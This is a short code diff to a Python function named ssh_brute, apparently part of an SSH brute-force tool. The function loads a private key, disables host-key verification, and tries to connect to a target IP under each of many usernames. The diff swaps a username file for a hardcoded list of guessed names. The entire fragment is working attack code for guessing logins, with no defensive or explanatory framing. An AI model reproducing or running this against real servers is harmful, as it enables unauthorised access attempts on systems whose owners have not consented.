@@ -56,8 +56,7 @@ def ssh_brute(ip, kf, ul_path):
     k = paramiko.RSAKey.from_private_key_file(kf)
     c = paramiko.SSHClient()
     c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    with open(ul_path, 'r') as f:
-        ul = [line.strip() for line in f.readlines()]
+    ul = ["hello1","hello2","hello3","hello4","hello5","hello6","hello7","hello8","hello9","hello0","hello11","hello12","hello123","hello134"]
     for u in ul:
         try:
             c.connect(hostname=ip, username=u, pkey=k, look_for_keys=False)
